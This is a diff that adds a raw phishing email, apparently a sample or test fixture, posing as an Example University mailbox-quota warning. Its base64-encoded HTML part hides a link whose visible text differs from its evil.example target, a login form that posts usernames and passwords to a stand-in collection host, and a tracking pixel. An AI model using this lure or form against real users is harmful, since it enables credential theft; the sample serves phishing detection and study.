@@ -1,0 +1,37 @@
+Received: from smtp.evil.example (smtp.evil.example [198.51.100.23])
+	by mx.example.edu (Postfix) with ESMTPS id 7Hh2
+	for <alice@example.edu>; Tue, 24 Nov 2026 08:12:44 +0000
+Authentication-Results: mx.example.edu;
+	spf=fail smtp.mailfrom=evil.example;
+	dkim=fail header.d=example.edu;
+	dmarc=fail header.from=example.edu
+From: Example University <noreply@example.edu>
+Reply-To: helpdesk@evil.example
+To: students@example.edu
+Subject: Mailbox quota exceeded
+Date: Tue, 24 Nov 2026 08:12:40 +0000
+Message-ID: <quota-02@evil.example>
+Return-Path: <bounce@evil.example>
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="alt-02"
+
+--alt-02
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Your mailbox is over quota. Sign in: https://www.example.edu/account
+--alt-02
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PGhlYWQ+PHN0eWxlPnB7Zm9udC1mYW1pbHk6QXJpYWx9PC9zdHlsZT48L2hlYWQ+PGJv
+ZHk+PHA+RGVhciBzdHVkZW50LDwvcD48cD5Zb3VyIG1haWxib3ggaXMgb3ZlciBxdW90YS4gU2ln
+biBpbiB0byBrZWVwIHJlY2VpdmluZyBtYWlsOjwvcD48cD48YSBocmVmPSJodHRwczovL2FjY291
+bnQtdmVyaWZ5LmV2aWwuZXhhbXBsZS9vd2EvbG9naW4iPmh0dHBzOi8vd3d3LmV4YW1wbGUuZWR1
+L2FjY291bnQ8L2E+PC9wPjxmb3JtIGFjdGlvbj0iaHR0cHM6Ly9jb2xsZWN0LmV2aWwuZXhhbXBs
+ZS9wb3N0IiBtZXRob2Q9InBvc3QiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1c2VyIj48aW5w
+dXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3MiPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVl
+PSJTaWduIGluIj48L2Zvcm0+PGltZyBzcmM9Imh0dHBzOi8vdHJhY2suZXZpbC5leGFtcGxlL29w
+ZW4uZ2lmP2lkPTQyIiB3aWR0aD0iMSIgaGVpZ2h0PSIxIj48cD5FeGFtcGxlIFVuaXZlcnNpdHkg
+SVQ8L3A+PC9ib2R5PjwvaHRtbD4=
+--alt-02--
